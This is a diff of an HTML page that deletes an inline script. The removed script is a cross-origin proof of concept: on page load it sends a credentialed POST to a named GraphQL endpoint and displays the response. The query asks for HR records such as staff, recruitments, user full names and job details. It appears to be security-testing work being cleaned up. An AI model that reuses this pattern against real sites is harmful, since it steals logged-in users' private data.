@@ -1,24 +1,5 @@
 <!DOCTYPE html>
 <html>
-  <script>
-    var invocation = new XMLHttpRequest();
-
-invocation.onreadystatechange = function() {
-  if (invocation.readyState == XMLHttpRequest.DONE) {
-    alert(invocation.response);
-  }
-}
-
-function cors(){
-if(invocation) {
-  invocation.open('POST', "https://hackers.trueplan.io/graphql", true);
-  invocation.withCredentials = true;
-  invocation.send('{"operationName":"dashboard","variables":{},"query":"query dashboard {\n  activePeople: people(status: \"active\") {\n    id\n    startDate\n    __typename\n  }\n  acceptedPeople: people(status: \"accepted\") {\n    id\n    startDate\n    __typename\n  }\n  hiredPeople: people(status: \"hired\") {\n    id\n    startDate\n    __typename\n  }\n  plannedRecruitments: recruitments(status: \"approved\") {\n    id\n    recruiter {\n      id\n      __typename\n    }\n    __typename\n  }\n  assignedRecruitments: recruitments(status: \"assigned\") {\n    id\n    recruiter {\n      id\n      __typename\n    }\n    __typename\n  }\n  workspaces {\n    id\n    name\n    workspaceType\n    user {\n      fullName\n      __typename\n    }\n    changes {\n      snapshot {\n        id\n        itemId\n        itemType\n        snapshotDate\n        itemAttributes\n        item {\n          ... on Job {\n            id\n            jobRole {\n              name\n              __typename\n            }\n            jobLevel {\n              name\n              __typename\n            }\n            location {\n              name\n              __typename\n            }\n            department {\n              name\n              __typename\n            }\n            tags {\n              name\n              tagGroup {\n                name\n                __typename\n              }\n              __typename\n            }\n            startDate\n            __typename\n          }\n          ... on Person {\n            id\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    canApprove {\n      value\n      __typename\n    }\n    __typename\n  }\n}\n"}'); 
-}
-}
-
-cors();
-  </script>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link rel="stylesheet" type="text/css" href="./assets/css/index.css" />
